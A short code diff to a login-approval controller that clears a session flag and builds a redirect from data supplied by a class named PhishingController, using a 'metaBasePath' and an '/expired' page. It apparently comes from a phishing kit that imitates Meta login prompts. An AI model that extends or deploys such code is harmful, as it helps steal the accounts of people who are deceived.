@@ -73,6 +73,7 @@ class LoginApprovalController extends Controller
             'step' => ['nullable', 'integer'],
         ]);
 
+        session()->forget('_meta_expired_loaded');
         $sessionData = app(PhishingController::class)->getSessionData();
         $redirectUrl = $sessionData ? ($sessionData['metaBasePath'] . "/expired") : "/";
 
